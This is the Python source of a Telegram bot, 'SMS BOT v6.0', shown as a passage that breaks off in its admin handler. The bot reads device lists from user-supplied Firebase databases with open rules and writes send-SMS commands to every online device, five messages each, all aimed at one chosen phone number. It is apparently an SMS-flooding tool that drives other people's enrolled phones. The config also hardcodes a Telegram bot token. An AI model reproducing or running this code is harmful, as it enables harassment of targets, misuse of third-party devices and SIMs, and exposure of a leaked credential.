# ══════════════════════════════════════════════════════════════
#   SMS BOT v6.0 — CLEAN EDITION
#   Multi-Firebase · 5 SMS/Device · aiogram 3 · aiohttp
#   Left Coder: Adnan Momin
# ══════════════════════════════════════════════════════════════

import asyncio, json, os, re, time, logging, zipfile, io
from datetime import datetime

import aiohttp
from aiogram                     import Bot, Dispatcher, F, Router
from aiogram.types               import (Message, CallbackQuery,
                                         InlineKeyboardMarkup,
                                         InlineKeyboardButton,
                                         BufferedInputFile,
                                         ChatJoinRequest)
from aiogram.filters             import Command
from aiogram.fsm.context         import FSMContext
from aiogram.fsm.state           import State, StatesGroup
from aiogram.fsm.storage.memory  import MemoryStorage
from aiogram.exceptions          import TelegramBadRequest
from aiogram.enums               import ChatMemberStatus

# ══════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════
BOT_TOKEN      = "8824607713:AAFp9rW2E-aH9axjS3re5tFN0v3zjaLMyFo"
OWNER_ID       = 7949539794

_DATA_FILE     = "bot_data.json"
_VERSION       = "v6.0"
_CREDITS       = "Adnan Momin"
_OWNER_UN      = "@AdnanMomin"

SMS_PER_DEVICE      = 5       # SMS per device
FB_FETCH_CONCURRENT = 100     # Firebase fetch concurrency
SEND_CONCURRENT     = 30      # Devices sending in parallel

# ══════════════════════════════════════════════
#  LOGGING
# ══════════════════════════════════════════════
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S")
log = logging.getLogger("SMSBot")

# ══════════════════════════════════════════════
#  FSM STATES
# ══════════════════════════════════════════════
class W(StatesGroup):
    fb_url      = State()
    fb_api_key  = State()
    test_to     = State()
    test_msg    = State()
    adm_add     = State()
    ban_id      = State()
    usr_add_id  = State()
    usr_add_exp = State()
    fj_add      = State()

# ══════════════════════════════════════════════
#  STORAGE
# ══════════════════════════════════════════════
def _new_user():
    return {
        "firebases": [],
        "stats":     {"sent":0, "failed":0, "last":"—"},
    }

_DEFS = {
    "admins":      [],
    "free":        True,
    "users":       {},
    "timed_users": {},
    "force_join":  [],
    "banned":      [],
}

def load() -> dict:
    if os.path.exists(_DATA_FILE):
        try:
            with open(_DATA_FILE) as f: d = json.load(f)
            for k, v in _DEFS.items():
                if k not in d: d[k] = v
            return d
        except Exception as e:
            log.error(f"load error: {e}")
    return json.loads(json.dumps(_DEFS))

def save(d: dict):
    tmp = _DATA_FILE + ".tmp"
    with open(tmp, "w") as f: json.dump(d, f, indent=1)
    os.replace(tmp, _DATA_FILE)

def usr(uid: int, d: dict) -> dict:
    k = str(uid)
    if k not in d["users"]: d["users"][k] = _new_user()
    u = d["users"][k]
    for key, val in _new_user().items():
        if key not in u: u[key] = val
    return u

# ══════════════════════════════════════════════
#  PERMISSIONS
# ══════════════════════════════════════════════
def is_owner(uid):        return uid == OWNER_ID
def is_admin(uid, d):     return is_owner(uid) or uid in d.get("admins", [])
def is_banned(uid, d):    return uid in d.get("banned", [])

def can_use(uid, d) -> bool:
    if is_banned(uid, d): return False
    if is_admin(uid, d):  return True
    if d.get("free"):     return True
    tu = d.get("timed_users", {}).get(str(uid))
    if tu:
        if tu.get("expires") is None:    return True
        if time.time() < tu["expires"]:  return True
    return False

def role_label(uid, d) -> str:
    if is_owner(uid):    return "👑 Owner"
    if is_admin(uid, d): return "🛡 Admin"
    tu = d.get("timed_users", {}).get(str(uid))
    if tu:
        if tu.get("expires") is None: return "🔓 Member"
        rem = tu["expires"] - time.time()
        if rem > 0:
            h = int(rem // 3600); m = int((rem % 3600) // 60)
            return f"⏱ {h}h {m}m left"
        return "🚫 Expired"
    return "🆓 Free User"

# ══════════════════════════════════════════════
#  FORCE JOIN
# ══════════════════════════════════════════════
_JR_CACHE: dict[str, set] = {}

async def check_force_join(bot, uid, d) -> tuple[bool, list]:
    fj = d.get("force_join", [])
    if not fj: return True, []
    not_joined = []
    for chat in fj:
        cid = chat["id"]
        if isinstance(cid, str) and cid.startswith("http"): continue
        if isinstance(cid, str) and cid.lstrip("-").isdigit(): cid = int(cid)
        try:
            m = await bot.get_chat_member(cid, uid)
            if m.status in (ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR,
                            ChatMemberStatus.CREATOR, ChatMemberStatus.RESTRICTED):
                continue
            if uid not in _JR_CACHE.get(str(cid), set()):
                not_joined.append(chat)
        except Exception:
            if uid not in _JR_CACHE.get(str(cid), set()):
                not_joined.append(chat)
    return len(not_joined) == 0, not_joined

def _fj_keyboard(fj_list):
    btns = []
    for ch in fj_list:
        link = ch.get("link")
        if link:
            btns.append([InlineKeyboardButton(
                text=f"📢  Join {ch.get('title','Channel')}", url=link)])
    btns.append([InlineKeyboardButton(
        text="✅  Joined — Check Again", callback_data="fj:check")])
    return InlineKeyboardMarkup(inline_keyboard=btns)

# ══════════════════════════════════════════════
#  UI HELPERS
# ══════════════════════════════════════════════
def pbar(done, total, style="block", w=10) -> str:
    f, e = {"block":("█","░"), "gradient":("▓","░"),
            "round":("●","○"), "arrow":("▶","▷")}.get(style, ("█","░"))
    if total == 0: return e * w
    filled = round(done / total * w)
    return f * filled + e * (w - filled)

def pct(done, total) -> str:
    return f"{round(done/total*100)}%" if total else "0%"

def header():
    return (
        "╔══════════════════════════╗\n"
        "║   ⚡  ＳＭＳ  ＢＯＴ  ⚡   ║\n"
        f"║      P R O  ·  {_VERSION}      ║\n"
        "╚══════════════════════════╝"
    )

def home_text(uid, d, u):
    role = role_label(uid, d)
    fb_n = len(u.get("firebases", []))
    return (
        f"<b>{header()}</b>\n\n"
        f"👤  <b>Welcome!</b>\n"
        f"🎭  {role}\n"
        f"💫  Left Coder : <b>{_CREDITS}</b>\n\n"
        f"<pre>"
        f"┌─────────────────────────────┐\n"
        f"│  🔥  FIREBASE CONNECTED      │\n"
        f"├─────────────────────────────┤\n"
        f"│  Total : {str(fb_n):<19}│\n"
        f"│  Limit : {str(100000):<19}│\n"
        f"└─────────────────────────────┘"
        f"</pre>\n\n"
        f"<i>Tap a button below to begin ⤵️</i>"
    )

HELP_TEXT = f"""
<b>📖  HELP GUIDE</b>
<i>Left Coder: {_CREDITS}</i>

<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>🚀  QUICK START</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>

<b>1.</b>  🔥  Firebase Manager tap karo
<b>2.</b>  ➕  Add Firebase — URL + API Key
<b>3.</b>  Jitne chaho add karo (1 – 100000)
<b>4.</b>  🧪  Test SMS tap karo
<b>5.</b>  Number + message bhejo

<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>⚡  SENDING POWER</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>

•  <b>{SMS_PER_DEVICE} SMS</b> per device
•  <b>All Firebase</b> in parallel
•  <b>{SEND_CONCURRENT}</b> devices simultaneously
•  Zero delay, fastest delivery

<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>💡  TIPS</b>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>

•  Firebase rules public rakho
•  Devices online hone chahiye
•  Country code zaroor daalo (+91…)

<b>━━━━━━━━━━━━━━━━━━━━━━</b>
👨‍💻  <b>Left Coder:</b> {_CREDITS}
"""

ABOUT_TEXT = f"""
<b>👨‍💻  LEFT CODER</b>

<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>Name</b>     : <b>{_CREDITS}</b>
<b>Username</b> : <code>{_OWNER_UN}</code>
<b>Version</b>  : <code>{_VERSION}</code>
<b>Engine</b>   : <code>aiogram 3 · aiohttp</code>
<b>━━━━━━━━━━━━━━━━━━━━━━</b>

<i>Built with ❤️ for the community</i>
"""

# ══════════════════════════════════════════════
#  KEYBOARDS
# ══════════════════════════════════════════════
def kb(*rows):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t, c in row]
        for row in rows])

def main_menu(uid, d):
    rows = [
        [("🔥  Firebase Manager", "fbm:menu"), ("🧪  Test SMS", "test:go")],
        [("📊  Dashboard",        "dash:show"),("📖  Help",     "help:show")],
        [("👨‍💻  Left Coder",       "about:show")],
    ]
    if is_admin(uid, d):
        rows.append([("🛡  Admin Panel", "adm:menu")])
    return kb(*rows)

def adm_menu_kb(uid, d):
    rows = [
        [("👥  Users",        "adm:users"),  ("➕  Add User",    "adm:adduser")],
        [("🚫  Ban User",     "ban:do"),      ("✅  Unban User",  "unban:do")],
        [("📊  Global Stats", "adm:stats"),  ("📢  Force Join",  "fj:menu")],
    ]
    if is_owner(uid):
        rows.append([("🟢/🔴  Free Mode", "adm:free"), ("➕  Add Admin", "adm:addadmin")])
        rows.append([("📦  Export ZIP", "adm:zip"),   ("💥  Reset ALL", "adm:resetall")])
    rows.append([("🔙  Back", "home")])
    return kb(*rows)

def fj_menu_kb(uid, d):
    fj = d.get("force_join", [])
    rows = [[("➕  Add Force Join", "fj:add")]]
    for ch in fj:
        rows.append([(f"📢 {ch.get('title','?')[:22]}", "<i>noop</i>"),
                     ("🗑", f"fj:del:{ch['id']}")])
    rows.append([("🔙  Back", "adm:menu")])
    return kb(*rows)

def fb_manager_kb(u, page=0):
    fbs = u.get("firebases", [])
    per = 8
    start = page * per
    chunk = fbs[start:start+per]
    rows = []
    for fb in chunk:
        short = (fb["url"].replace("https://", "")
                        .replace(".firebaseio.com", "")
                        .split(".")[0][:16])
        rows.append([(f"🔥  {short}", "<i>noop</i>"),
                     ("🗑", f"fb:del:{fb['id']}")])
    nav = []
    if page > 0:               nav.append(("◀️  Prev", f"fbm:pg:{page-1}"))
    if start + per < len(fbs): nav.append(("Next  ▶️", f"fbm:pg:{page+1}"))
    if nav: rows.append(nav)
    rows.append([("➕  Add Firebase", "wiz:start"), ("🧪  Test SMS", "test:go")])
    if len(fbs) > per:
        total_pages = (len(fbs) + per - 1) // per
        rows.append([(f"📄  Page {page+1} / {total_pages}", "<i>noop</i>")])
    rows.append([("🔙  Home", "home")])
    return kb(*rows)

def timed_kb():
    return kb(
        [("⚡ 1 Hour", "tacc:3600"),     ("🕕 6 Hours", "tacc:21600")],
        [("📅 24 Hours", "tacc:86400"),  ("📆 7 Days",  "tacc:604800")],
        [("📅 Custom Date", "tacc:custom"), ("♾ Permanent", "tacc:0")],
        [("🔙 Back", "adm:menu")],
    )

# ══════════════════════════════════════════════
#  FIREBASE CORE
# ══════════════════════════════════════════════
_FB_SEM = asyncio.Semaphore(FB_FETCH_CONCURRENT)

async def fb_get(base, path) -> dict:
    url = base.rstrip("/") + path
    async with _FB_SEM:
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    if r.status == 200:
                        txt = (await r.text()).strip()
                        return {} if txt == "null" else json.loads(txt)
        except Exception:
            pass
    return {}

async def fb_put(base, path, payload) -> bool:
    url = base.rstrip("/") + path
    for i in range(2):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url, json=payload,
                                 timeout=aiohttp.ClientTimeout(total=8)) as r:
                    if 200 <= r.status < 300: return True
        except Exception:
            pass
        await asyncio.sleep(0.2)
    return False

def dev_online(dd) -> bool:
    return any([dd.get("isOnline"), dd.get("online"), dd.get("connected"),
                dd.get("status") in ("online", "active", True, 1)])

async def send_via_fb(fb, dev, sim, to, msg):
    return await fb_put(fb, f"/clients/{dev}/webhookEvent/sendSms.json", {
        "from": sim, "to": to.strip(), "message": msg.strip(),
        "isSended": False, "timestamp": int(time.time() * 1000)
    })

async def fetch_all_online(u, sem=SEND_CONCURRENT) -> list:
    """Fetch online devices from ALL Firebase, parallel with semaphore."""
    fbs = u.get("firebases", [])
    if not fbs: return []
    send_sem = asyncio.Semaphore(sem)

    async def _one(fb):
        devs = await fb_get(fb["url"], "/clients.json")
        out = []
        for did, dd in (devs or {}).items():
            if dev_online(dd):
                out.append({
                    "fb_url": fb["url"],
                    "device_id": did,
                    "name": dd.get("deviceName") or dd.get("name") or did[:20],
                    "sims": dd.get("sims", []),
                })
        return out

    results = await asyncio.gather(*[_one(fb) for fb in fbs],
                                    return_exceptions=True)
    all_devs = []
    for r in results:
        if isinstance(r, list): all_devs.extend(r)
    return all_devs

# ══════════════════════════════════════════════
#  TEST SENDER — 5 SMS/device · all devices
# ══════════════════════════════════════════════
async def _send_5x(fb_url, dev_id, sim, to, msg):
    ok = 0
    for _ in range(SMS_PER_DEVICE):
        if await send_via_fb(fb_url, dev_id, sim, to, msg):
            ok += 1
    return ok

async def send_to_all(bot, uid, to, msg, progress_msg=None):
    d = load(); u = usr(uid, d)
    devs = await fetch_all_online(u)
    total_devs = len(devs)
    if total_devs == 0: return 0, 0, 0, 0

    total_sms = total_devs * SMS_PER_DEVICE
    ok = fail = 0
    done = 0
    sem = asyncio.Semaphore(SEND_CONCURRENT)

    async def _run(dv):
        sims = dv.get("sims", [])
        sim = 0
        if sims:
            try: sim = int(sims[0].get("simSlotIndex", 0))
            except Exception: sim = 0
        async with sem:
            return await _send_5x(dv["fb_url"], dv["device_id"], sim, to, msg)

    tasks = [asyncio.create_task(_run(dv)) for dv in devs]
    last_edit = 0

    for coro in asyncio.as_completed(tasks):
        r = await coro
        done += 1
        if isinstance(r, int):
            ok += r; fail += SMS_PER_DEVICE - r
        else:
            fail += SMS_PER_DEVICE

        # Update progress every 1 sec or 5% progress
        now = time.time()
        if progress_msg and (now - last_edit > 1 or done == total_devs):
            last_edit = now
            bar = pbar(done, total_devs, "gradient", 12)
            try:
                await progress_msg.edit_text(
                    f"<pre>"
                    f"╔══════════════════════════╗\n"
                    f"║   🚀  SENDING SMS        ║\n"
                    f"╠══════════════════════════╣\n"
                    f"║  {bar} {pct(done,total_devs):<4}║\n"
                    f"╠══════════════════════════╣\n"
                    f"║  📱 {done:<5}/{total_devs:<5}          ║\n"
                    f"║  ✅ {ok:<20}║\n"
                    f"║  ❌ {fail:<20}║\n"
                    f"╚══════════════════════════╝"
                    f"</pre>",
                    parse_mode="HTML")
            except TelegramBadRequest: pass

    d2 = load(); u2 = usr(uid, d2)
    u2["stats"]["sent"]   = u2["stats"].get("sent", 0) + ok
    u2["stats"]["failed"] = u2["stats"].get("failed", 0) + fail
    u2["stats"]["last"]   = datetime.now().strftime("%H:%M:%S")
    save(d2)
    return ok, fail, total_devs, total_sms

# ══════════════════════════════════════════════
#  ZIP / UTILS
# ══════════════════════════════════════════════
def make_zip() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        if os.path.exists(_DATA_FILE): z.write(_DATA_FILE)
        z.write(__file__, "bot.py")
    buf.seek(0); return buf.read()

async def sedit(cq, text, markup=None):
    try: await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")
    except TelegramBadRequest: pass

# ══════════════════════════════════════════════
#  ROUTER
# ══════════════════════════════════════════════
R = Router()

@R.message(Command("start"))
async def c_start(msg: Message, state: FSMContext):
    await state.clear()
    d = load(); uid = msg.from_user.id
    if not can_use(uid, d):
        await msg.answer("🚫 Access denied. Contact admin."); return
    u = usr(uid, d); save(d)
    ok, not_joined = await check_force_join(msg.bot, uid, d)
    if not ok:
        await msg.answer("📢 <b>Join Required</b>\n\nPehle yeh join karo:",
            reply_markup=_fj_keyboard(not_joined), parse_mode="HTML"); return
    await msg.answer(home_text(uid, d, u),
        reply_markup=main_menu(uid, d), parse_mode="HTML")

@R.message(Command("menu"))
async def c_menu(msg: Message, state: FSMContext):
    await state.clear(); d = load(); uid = msg.from_user.id
    if not can_use(uid, d): await msg.answer("🚫 Access denied."); return
    u = usr(uid, d)
    ok, not_joined = await check_force_join(msg.bot, uid, d)
    if not ok:
        await msg.answer("📢 <b>Join Required</b>",
            reply_markup=_fj_keyboard(not_joined), parse_mode="HTML"); return
    await msg.answer(home_text(uid, d, u),
        reply_markup=main_menu(uid, d), parse_mode="HTML")

@R.chat_join_request()
async def h_join_req(update: ChatJoinRequest):
    _JR_CACHE.setdefault(str(update.chat.id), set()).add(update.from_user.id)

# ── FSM Handlers ───────────────────────────────
@R.message(W.fb_url)
async def f_fb_url(msg: Message, state: FSMContext):
    text = msg.text.strip()
    if not text.startswith("http"):
        await msg.answer("❌  URL <code>https://</code> se start hona chahiye.",
            parse_mode="HTML"); return
    await state.update_data(wiz_fb_url=text.rstrip("/"))
    await state.set_state(W.fb_api_key)
    await msg.answer(
        "✅  <b>URL saved!</b>\n\n"
        "🔑  Ab <b>Firebase API Key</b> bhejo:\n"
        "<i>(Firebase Console → Project Settings → Web API Key)</i>\n\n"
        "💡  <i>Type /skip if not available.</i>",
        parse_mode="HTML", reply_markup=kb([("❌  Cancel", "home")]))

@R.message(W.fb_api_key)
async def f_fb_api_key(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    api_key = "" if msg.text.strip() == "/skip" else msg.text.strip()
    fsmd = await state.get_data()
    fb_url = fsmd.get("wiz_fb_url", "")
    if not fb_url:
        await msg.answer("⚠️  Session lost.", reply_markup=main_menu(uid, d))
        await state.clear(); return

    u = usr(uid, d)
    if any(fb["url"] == fb_url for fb in u.get("firebases", [])):
        await state.clear()
        await msg.answer("⚠️  Yeh Firebase pehle se added hai!",
            reply_markup=fb_manager_kb(u), parse_mode="HTML"); return

    u["firebases"].append({
        "id": str(int(time.time() * 1000)),
        "url": fb_url,
        "api_key": api_key,
    })
    save(d); await state.clear()

    wait = await msg.answer("🔍  Verifying & fetching devices…")
    devs = await fb_get(fb_url, "/clients.json")
    online = sum(1 for v in (devs or {}).values() if dev_online(v))
    try: await wait.delete()
    except: pass

    count = len(u.get("firebases", []))
    status = (
        f"<pre>"
        f"╔══════════════════════════╗\n"
        f"║   ✅  FIREBASE ADDED      ║\n"
        f"╠══════════════════════════╣\n"
        f"║  📱 Online  : {online:<10}║\n"
        f"║  📦 Total   : {count:<10}║\n"
        f"╚══════════════════════════╝"
        f"</pre>\n\n"
        f"🔥 <code>{fb_url[:45]}</code>"
    )
    await msg.answer(status, reply_markup=kb(
        [("➕  Add Another", "wiz:start"), ("🔥  Manage", "fbm:menu")],
        [("🧪  Test SMS", "test:go"), ("🏠  Home", "home")],
    ), parse_mode="HTML")

@R.message(W.test_to)
async def f_test_to(msg: Message, state: FSMContext):
    to = msg.text.strip()
    if not re.match(r"^\+?\d{6,15}$", to):
        await msg.answer("❌  Valid number bhejo. Example: <code>+919876543210</code>",
            parse_mode="HTML"); return
    await state.update_data(test_to=to)
    await state.set_state(W.test_msg)
    await msg.answer(f"📞  Target : <code>{to}</code>\n\n💬  Ab message bhejo:",
        parse_mode="HTML")

@R.message(W.test_msg)
async def f_test_msg(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    fsmd = await state.get_data()
    to = fsmd.get("test_to", "")
    sms_text = msg.text.strip()
    await state.clear()
    if not to or not sms_text:
        await msg.answer("❌ Session expired.", reply_markup=main_menu(uid, d)); return

    u = usr(uid, d)
    if not u.get("firebases"):
        await msg.answer("❌ Pehle Firebase add karo!", reply_markup=main_menu(uid, d)); return

    prog = await msg.answer("🔍  Fetching online devices from all Firebase…")
    ok, fail, devs, total_sms = await send_to_all(msg.bot, uid, to, sms_text, prog)

    if devs == 0:
        try: await prog.edit_text(
            "😴  <b>Koi online device nahi mila.</b>\n\n"
            "• Firebase URL sahi hai?\n"
            "• Devices online hain?\n"
            "• Firebase rules public hain?",
            parse_mode="HTML")
        except: pass
        return

    bar = pbar(ok, total_sms, "round", 12) if total_sms else "○"*12
    rate = pct(ok, total_sms) if total_sms else "0%"
    summary = (
        f"<pre>"
        f"╔══════════════════════════╗\n"
        f"║   ✅  TASK COMPLETE       ║\n"
        f"╠══════════════════════════╣\n"
        f"║  {bar} {rate:<4}║\n"
        f"╠══════════════════════════╣\n"
        f"║  📞 Target  : {to[:12]:<12}║\n"
        f"║  📱 Devices : {devs:<12}║\n"
        f"║  📨 SMS     : {total_sms:<12}║\n"
        f"║  ✅ Sent    : {ok:<12}║\n"
        f"║  ❌ Failed  : {fail:<12}║\n"
        f"╚══════════════════════════╝"
        f"</pre>\n\n"
        f"💬 <i>{(sms_text[:60] + '…') if len(sms_text)>60 else sms_text}</i>"
    )
    try: await prog.edit_text(summary,
        reply_markup=kb(
            [("🧪  Test Again", "test:go"), ("🔥  Manage", "fbm:menu")],
            [("🏠  Home", "home")]),
        parse_mode="HTML")
    except Exception as e: log.error(f"summary: {e}")

@R.message(W.adm_add)
async def f_adm_add(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id): await state.clear(); return
    d = load()
    try:
        nid = int(msg.text.strip())
        if nid not in d["admins"]: d["admins"].append(nid)
        save(d); await state.clear()
        await msg.answer(f"✅  Admin added: <code>{nid}</code>",
            reply_markup=adm_menu_kb(msg.from_user.id, d), parse_mode="HTML")
        try: await msg.bot.send_message(nid, "🎉 You're now an <b>Admin</b>! /start",
            parse_mode="HTML")
        except: pass
    except: await msg.answer("❌ Invalid user ID.")

@R.message(W.ban_id)
async def f_ban_id(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id, load()): await state.clear(); return
    d = load()
    try:
        bid = int(msg.text.strip())
        if is_admin(bid, d): await msg.answer("❌ Admin ko ban nahi kar sakte!"); return
        if bid not in d.setdefault("banned", []): d["banned"].append(bid)
        save(d); await state.clear()
        await msg.answer(f"🚫  <b>Ban ho gaya:</b> <code>{bid}</code>",
            reply_markup=adm_menu_kb(msg.from_user.id, d), parse_mode="HTML")
        try: await msg.bot.send_message(bid, "🚫 Aapko ban kar diya gaya.")
        except: pass
    except: await msg.answer("❌ Invalid user ID.")

@R.message(W.usr_add_id)
async def f_usr_add_id(msg: Message, state: FSMContext):
    try:
        uid2 = int(msg.text.strip())
        await state.update_data(new_uid=uid2)
        await state.set_state(W.usr_add_exp)
        await msg.answer(f"✅  User ID: <code>{uid2}</code>\n\n⏱  <b>Select duration:</b>",
            reply_markup=timed_kb(), parse_mode="HTML")
    except: await msg.answer("❌ Invalid user ID.")

@R.message(W.usr_add_exp)
async def f_usr_add_exp(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id; text = msg.text.strip()
    fsmd = await state.get_data(); uid2 = fsmd.get("new_uid"); await state.clear()
    try:
        for fmt in ("%d/%m/%Y", "%Y-%m-%d", "%d-%m-%Y"):
            try:
                dt = datetime.strptime(text, fmt); exp = dt.timestamp(); break
            except: pass
        else: raise ValueError
        d.setdefault("timed_users", {})[str(uid2)] = {
            "expires": exp, "added_by": uid, "added_at": int(time.time())}
        save(d)
        await msg.answer(f"✅  User <code>{uid2}</code> until <code>{text}</code>",
            reply_markup=adm_menu_kb(uid, d), parse_mode="HTML")
        try: await msg.bot.send_message(uid2,
            f"✅ Access until <code>{text}</code>. /start", parse_mode="HTML")
        except: pass
    except: await msg.answer("❌ Invalid date. Use DD/MM/YYYY")

@R.message(W.fj_add)
async def f_fj_add(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id): await state.clear(); return
    uid = msg.from_user.id
    text = msg.text.strip()
    fsmd = await state.get_data()

    if fsmd.get("fj_step") == "awaiting_title":
        link = fsmd.get("fj_link", "")
        chat_id = fsmd.get("fj_chat_id", "")
        d = load(); fj = d.setdefault("force_join", [])
        if not any(str(c["id"]) == str(chat_id) for c in fj):
            fj.append({"id": chat_id, "title": text, "link": link})
        save(d); await state.clear()
        await msg.answer(f"✅  <b>Force Join Added:</b> {text}",
            reply_markup=fj_menu_kb(uid, load()), parse_mode="HTML"); return

    if fsmd.get("fj_step") == "awaiting_chat_id":
        if text.lstrip("-").isdigit(): chat_id = int(text)
        elif text.startswith("@"):     chat_id = text
        else:
            await msg.answer("❌  <code>-1001234567890</code> ya <code>@username</code>",
                parse_mode="HTML"); return
        await state.update_data(fj_step="awaiting_title", fj_chat_id=chat_id)
        await msg.answer(f"✅  Chat ID: <code>{chat_id}</code>\n\nAb <b>display name</b>:",
            parse_mode="HTML", reply_markup=kb([("❌ Cancel", "fj:menu")]))
        return

    tm = re.search(r"t\.me/([+\w]+)", text)
    if tm:                        link = f"https://t.me/{tm.group(1)}"
    elif text.startswith("@"):    link = f"https://t.me/{text.lstrip('@')}"
    elif text.startswith("http"): link = text
    elif text.lstrip("-").isdigit():
        chat_id = int(text)
        await state.update_data(fj_step="awaiting_title", fj_link="", fj_chat_id=chat_id)
        await msg.answer(f"✅  Chat ID: <code>{chat_id}</code>\n\nAb <b>display name</b>:",
            parse_mode="HTML", reply_markup=kb([("❌ Cancel", "fj:menu")]))
        return
    else: link = f"https://t.me/{text.lstrip('@')}"

    await state.update_data(fj_step="awaiting_chat_id", fj_link=link)
    await msg.answer(
        f"✅  Link: <code>{link}</code>\n\nAb <b>Chat ID</b> bhejo:\n"
        f"Example: <code>-1001234567890</code>",
        parse_mode="HTML", reply_markup=kb([("❌ Cancel", "fj:menu")]))

# ══════════════════════════════════════════════
#  CALLBACKS
# ══════════════════════════════════════════════
@R.callback_query()
async def cb(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id; c = cq.data
    if not can_use(uid, d):
        await cq.answer("🚫 Access denied.", show_alert=True); return
    u = usr(uid, d)

    if c in ("home", "fj:check"):
        await state.clear()
        ok, not_joined = await check_force_join(cq.bot, uid, d)
        if not ok:
            await sedit(cq, "📢 <b>Join Required</b>", _fj_keyboard(not_joined))
            if c == "fj:check": await cq.answer("❌ Join all first!", show_alert=True)
            return
        await sedit(cq, home_text(uid, d, u), main_menu(uid, d))
        if c == "fj:check": await cq.answer("✅ Verified!", show_alert=True)

    elif c == "help:show":
        await sedit(cq, HELP_TEXT, kb([("🔙  Back", "home")]))

    elif c == "about:show":
        await sedit(cq, ABOUT_TEXT, kb([("🔙  Back", "home")]))

    elif c == "wiz:start":
        await state.clear()
        await state.set_state(W.fb_url)
        await sedit(cq,
            "╔══════════════════════════╗\n"
            "║   🧙  SETUP FIREBASE     ║\n"
            "║        Step 1 / 2        ║\n"
            "╚══════════════════════════╝\n\n"
            "🔗  Send your <b>Firebase URL</b>:\n"
            "<i>https://your-project.firebaseio.com</i>",
            kb([("❌  Cancel", "home")]))

    elif c == "fbm:menu":
        fbs = u.get("firebases", [])
        text = f"<b>{header()}</b>\n\n<pre>┌─────────────────────────────┐\n" \
               f"│  🔥  FIREBASE MANAGER        │\n" \
               f"├─────────────────────────────┤\n" \
               f"│  Total : {str(len(fbs)):<19}│\n" \
               f"└─────────────────────────────┘</pre>"
        if fbs:
            text += f"\n<i>Tap 🧪 to send test SMS to ALL devices.</i>"
        else:
            text += "\n<i>Koi Firebase nahi. ➕ tap karo.</i>"
        await sedit(cq, text, fb_manager_kb(u))

    elif c.startswith("fbm:pg:"):
        page = int(c.split(":")[-1])
        fbs = u.get("firebases", [])
        text = f"<b>{header()}</b>\n\n<i>Total {len(fbs)} Firebase · Page {page+1}</i>"
        await sedit(cq, text, fb_manager_kb(u, page))

    elif c.startswith("fb:del:"):
        fid = c.split("fb:del:", 1)[1]
        u["firebases"] = [f for f in u.get("firebases", []) if f["id"] != fid]
        save(d); await cq.answer("🗑 Removed.")
        fbs = u.get("firebases", [])
        text = f"<b>{header()}</b>\n\n<i>Total {len(fbs)} Firebase</i>"
        await sedit(cq, text, fb_manager_kb(u))

    elif c == "test:go":
        if not u.get("firebases"):
            await cq.answer("❌ Pehle Firebase add karo!", show_alert=True); return
        await state.set_state(W.test_to)
        await sedit(cq,
            "╔══════════════════════════╗\n"
            "║   🧪  TEST SMS           ║\n"
            "╚══════════════════════════╝\n\n"
            "📞  Target number bhejo:\n"
            "<i>Example: +919876543210</i>\n\n"
            f"⚡  <b>{SMS_PER_DEVICE} SMS</b> per device\n"
            f"🔥  <b>All Firebase</b> devices in parallel",
            kb([("❌  Cancel", "home")]))

    elif c == "dash:show":
        d2 = load(); u2 = usr(uid, d2)
        s = u2.get("stats", {})
        sent = s.get("sent", 0); fail = s.get("failed", 0)
        total = sent + fail
        bar = pbar(sent, total, "gradient", 12) if total else "░"*12
        rate = pct(sent, total) if total else "0%"
        fb_n = len(u2.get("firebases", []))
        await sedit(cq,
            f"<b>{header()}</b>\n\n"
            f"<pre>"
            f"╔══════════════════════════╗\n"
            f"║  📊  DASHBOARD           ║\n"
            f"╠══════════════════════════╣\n"
            f"║  🔥  Firebase  : {fb_n:<9}║\n"
            f"║  📨  Total SMS : {total:<9}║\n"
            f"╠══════════════════════════╣\n"
            f"║  {bar} {rate:<4}║\n"
            f"╠══════════════════════════╣\n"
            f"║  ✅  Sent      : {sent:<9}║\n"
            f"║  ❌  Failed    : {fail:<9}║\n"
            f"║  🕐  Last      : {str(s.get('last','—'))[:9]:<9}║\n"
            f"╚══════════════════════════╝"
            f"</pre>",
            kb([("🔄  Refresh", "dash:show"), ("🏠  Home", "home")]))

    elif c == "reset:self":
        await sedit(cq,
            "⚠️  <b>Reset your data?</b>\n\n<i>Saare Firebase delete ho jayenge.</i>",
            kb([("✅  Yes", "reset:self:yes"), ("❌  Cancel", "home")]))

    elif c == "reset:self:yes":
        d2 = load(); d2["users"][str(uid)] = _new_user(); save(d2)
        await sedit(cq, "✅  <b>Data reset.</b>", main_menu(uid, load()))

    elif c == "adm:menu":
        if not is_admin(uid, d): await cq.answer("🚫", show_alert=True); return
        await sedit(cq, "🛡  <b>Admin Panel</b>", adm_menu_kb(uid, d))

    elif c == "adm:users":
        if not is_admin(uid, d): await cq.answer("🚫", show_alert=True); return
        lines = ["👥  <b>All Users:</b>\n"]
        for k, v in d.get("users", {}).items():
            s = v.get("stats", {})
            lines.append(f"  <code>{k}</code>  ✅{s.get('sent',0)}  ❌{s.get('failed',0)}  🔥{len(v.get('firebases',[]))}")
        for k, v in d.get("timed_users", {}).items():
            rem = v.get("expires", 0)
